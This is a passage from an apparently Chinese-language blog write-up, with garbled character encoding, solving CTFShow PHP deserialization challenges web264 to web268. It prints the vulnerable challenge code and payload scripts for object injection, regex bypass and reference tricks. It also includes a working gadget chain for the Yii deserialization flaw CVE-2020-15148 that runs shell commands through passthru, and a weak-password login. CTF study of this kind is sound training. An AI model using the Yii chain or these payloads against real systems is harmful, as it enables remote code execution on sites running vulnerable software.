class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>message.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>å‘ç°å¾ˆçœ¼ç†Ÿï¼Œåœ¨ web262çš„åŸºç¡€ä¸Šæ”¹ä¸ºäº† SESSIONååºåˆ—åŒ–ã€‚</li>
<li>ç„¶è€Œ SESSION æˆ‘ä»¬æ§åˆ¶ä¸äº†ã€‚</li>
<li>message.php ä¸­ éœ€è¦ è®¾ç½® ä¸€ä¸ª cookie æ‰èƒ½æ‰§è¡Œ if ä¸­çš„å†…å®¹ã€‚éšä¾¿è®¾ç½®ã€‚</li>
</ul>
<p>payload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$s_msg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>,<span class="string">&#x27;loveU&#x27;</span>,serialize(<span class="variable">$msg</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s_msg</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>è®¿é—® index.php(å¸¦å‚æ•°)ï¼›</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f=<span class="number">1</span>&amp;m=<span class="number">2</span>&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web264_1.png"></p>
<ul>
<li>è®¿é—® message.php å¹¶éšä¾¿è®¾ç½®ä¸€ä¸ª cookie: msg=1(æ³¨æ„ hackbar è®¾ç½® cookie å¤±è´¥)</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web264.png" alt="flag"></p>
<h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;login())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li><p>mt_rand()ç³»ç»Ÿäº§ç”Ÿéšæœºå€¼ï¼Œæ¯æ¬¡éšæœºå€¼éƒ½ä¸ä¸€æ ·ï¼Œä¸”ç”±md5()åŒ…è£¹ï¼Œé‚£é‚£ä¹ˆè¿™ä¸ªæ›´æ˜¯æˆ‘ä»¬æ§åˆ¶ä¸äº†çš„ã€‚</p>
</li>
<li><p>åœ¨ class ä¸­ è¦æ±‚ token === passwordï¼Œ å…¨ç­‰ï¼Œtokenæ§åˆ¶ä¸äº†ï¼Œæ‹¿åªèƒ½ä» password å…¥æ‰‹ï¼Œè®© password ç­‰äºtokençš„åœ°å€ã€‚</p>
</li>
<li><p>$this-&gt;password = &amp;$this-&gt;token;</p>
</li>
</ul>
<p>payload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = &amp;<span class="keyword">$this</span>-&gt;token; <span class="comment">// å–åœ°å€ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfshowAdmin(<span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>ç»“æœ:</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web265.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?ctfshow=O:<span class="number">12</span>:<span class="string">&quot;ctfshowAdmin&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web265_1.png"></p>
<h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@unserialize(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>$cs = file_get_contents(â€˜php://inputâ€™); æ­¤å¤„åˆ©ç”¨äº† ä¼ªåè®®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥postæäº¤æ•°æ®ã€‚</li>
<li>ç„¶åçœ‹ class ä¸­ flag åœ¨ destruct() é”€æ¯çš„æ—¶å€™è°ƒç”¨ã€‚å…¶å®ƒä¸‰ä¸ªå‡½æ•°è°ƒç”¨ä¸è°ƒç”¨ï¼Œæ­£ç¡®ï¼Œé”™è¯¯ï¼Œåœ¨è¿™é“é¢˜ä¸­éƒ½ä¸å½±å“ç»“æœï¼Œå”¯æœ‰ destruct() æ‰å½±å“ç»“æœã€‚å› æ­¤å¯ä»¥å†™ä¸€ä¸ªç©ºçš„classã€‚</li>
<li>ä¸‹é¢çš„ if è¯­å¥ æ­£åˆ™å¯¹ â€˜ctfshowâ€™ è¿›è¡Œäº†åŒ¹é…ï¼Œæœ‰åˆ™æŠ›å‡ºå¼‚å¸¸ destruct()å°†æå‰ç»ˆæ­¢ã€‚å› æ­¤æˆ‘ä»¬ä¸èƒ½è®©å®ƒæœ‰å¼‚å¸¸ã€‚å°† ctfshow å…¶ä¸­ä¸€ä¸ªå­—ç¬¦æ”¹ä¸º å¤§å†™,ex: Ctfshow or cTfshow â€¦â€¦ å°±èƒ½ç»•è¿‡ã€‚</li>
</ul>
<p>payload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>ç»“æœ:</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web266.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">0</span>:&#123;&#125; <span class="comment">//echo ç»“æœ.</span></span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;cTfshow&quot;</span>:<span class="number">0</span>:&#123;&#125; <span class="comment">//å¤§å†™ç»•è¿‡æ­£åˆ™ã€‚(ç ´åæ­£ç¡®åºåˆ—åŒ–ç»“æœã€‚)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å°†åºåˆ—åŒ–ç»“æœ post æäº¤ã€‚åœ¨chromeæµè§ˆå™¨Hack Baræ’ä»¶ä¸­post æäº¤æ²¡ååº”ã€‚é‚£å°±æŠ“åŒ…æäº¤(bp å¤§æ³•å¥½å•Š!)ã€‚</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web266_1.png"></p>
<h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2><p>ç½‘é¡µ:</p>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267.png"></p>
<p>é¢˜ç›®å˜å¾—è´´è¿‘çœŸå®ç¯å¢ƒäº†ã€‚</p>
<h3 id="ä¿¡æ¯æœé›†ä¸åˆ©ç”¨"><a href="#ä¿¡æ¯æœé›†ä¸åˆ©ç”¨" class="headerlink" title="ä¿¡æ¯æœé›†ä¸åˆ©ç”¨"></a>ä¿¡æ¯æœé›†ä¸åˆ©ç”¨</h3><ul>
<li>Wappalyzer æ’ä»¶å¯ä»¥çœ‹åˆ°è¿™ä¸ªç½‘é¡µç”±php Yiiæ¡†æ¶ç¼–å†™:</li>
<li>å¼±å£ä»¤ admin:admin ç™»é™†æˆåŠŸã€‚</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_1.png"></p>
<ul>
<li>åœ¨ about é¡µé¢ å³é”®æŸ¥çœ‹æºä»£ç å‘ç°æç¤º: ?view-source</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_3.png"></p>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_2.png"></p>
<ul>
<li>çœ‹åˆ° ?xxx ç»„æˆçš„å†…å®¹å¾ˆå®¹æ˜“è”æƒ³åˆ° get ä¼ å‚ã€‚æ‰€ä»¥æˆ‘ä»¬æ¥çœ‹çœ‹ é¡µé¢çš„ urlæ„æˆ:</li>
<li>url:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?r=site%<span class="number">2</span>Fabout <span class="comment">// %2F urldecode: &#x27;/&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>æ„é€  url ,å¾—åˆ°:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?r=site%<span class="number">2</span>Fabout&amp;view-source</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_4.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤ºå¾—åˆ°äº† ååºåˆ—åŒ–çš„å…¥å£äº†ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?r=backdoor/shell&amp;code=</span><br></pre></td></tr></table></figure>

<ul>
<li>é—®é¢˜æ¥äº† codeç­‰äºå•¥å‘¢ï¼Ÿ</li>
<li>ç™¾åº¦ä¸€ä¸‹ yii ååºåˆ—åŒ–æ¼æ´ï¼Œå¾—åˆ°äº†ä¸€ä¸ªé“¾å­,å¹¶ä¸”æœ‰ CVE-2020-15148;</li>
<li>ç›´æ¥æ‹¿æ¥åˆ©ç”¨ã€‚</li>
</ul>
<p>poc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// å¯æ§å‚æ•°</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// å¯æ§å‚æ•°</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>æ­¤æ—¶å¯æ§å‚æ•°ä¸ºæ˜¾ç¤º phpinfo éªŒè¯ä¸€ä¸‹ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?r=/backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_5.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤ºæˆåŠŸæ˜¾ç¤ºäº† phpinfo(),æ¥ä¸‹æ¥ å°è¯•æ˜¾ç¤ºå½“å‰ç›®å½•æˆ–è€…æ ¹ç›®å½•æ–‡ä»¶</li>
<li>å°† poc.php ä¸­è®¾ç½®å¯æ§å‚æ•° $this-&gt;checkAccess = â€˜passthruâ€™; (æ³¨æ„ systemæ­¤å¤„ä¸å¯ç”¨ï¼Œç”¨ passthruå¯ä»£æ›¿)</li>
<li>è®¾ç½® $this-&gt;id = â€˜ls /â€˜;</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_6.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤º å‘ç°æ ¹ç›®å½•æœ‰ flag</li>
<li>è®¾ç½®  $this-&gt;id = â€˜tac /flagâ€™;</li>
</ul>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_7.png"></p>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_9.png"></p>
<p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web267_8.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤ºæˆåŠŸæ‹¿åˆ° flagã€‚</li>
</ul>
<h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><p>åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šï¼Œéœ€è¦å¯¹ exp è¿›è¡Œæ›´æ”¹,å‚è€ƒäº†å…¶å®ƒå¸ˆå‚…çš„é“¾å­ã€‚</p>
